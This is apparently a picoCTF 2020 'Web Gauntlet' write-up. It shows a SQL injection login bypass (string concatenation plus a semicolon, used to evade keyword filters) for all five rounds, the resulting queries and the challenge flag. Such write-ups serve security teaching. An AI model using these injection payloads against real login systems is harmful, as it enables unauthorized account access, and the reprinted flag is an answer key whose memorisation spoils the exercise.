# Web Gauntlet

```markdown
Tags: `picoCTF 2020 Mini-Competition` `Web Exploitation` 
```

## **Description**

Can you beat the filters? Log in as admin [http://jupiter.challenges.picoctf.org:29164/](http://jupiter.challenges.picoctf.org:29164/) [http://jupiter.challenges.picoctf.org:29164/filter.php](http://jupiter.challenges.picoctf.org:29164/filter.php)

## Round 1/5

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

The filter of round 1: OR&#x20;

```sql
Username: ad'||'min';
password: 1
```

```sql
SELECT * FROM users WHERE username='ad'||'min';' AND password='1'
```

## Round 2/5

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

The filter of round 2: or and like = --

```sql
Username: ad'||'min';
password: 1
```

```sql
SELECT * FROM users WHERE username='ad'||'min';' AND password='1'
```

## Round 3/5

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

The filter of round 3: or and = like > < --

```sql
Username: ad'||'min';
password: 1
```

```sql
SELECT * FROM users WHERE username='ad'||'min';' AND password='1'
```

## Round 4/5

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

The filter of round 4: or and = like > < -- admin

```sql
Username: ad'||'min';
password: 1
```

```sql
SELECT * FROM users WHERE username='ad'||'min';' AND password='1'
```

## Round 5/5

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

The filter of round 5: or and = like > < -- union admin

```sql
Username: ad'||'min';
password: 1
```

```sql
SELECT * FROM users WHERE username='ad'||'min';' AND password='1' 
```

## Flag

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p><code>picoCTF{y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5}</code></p></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
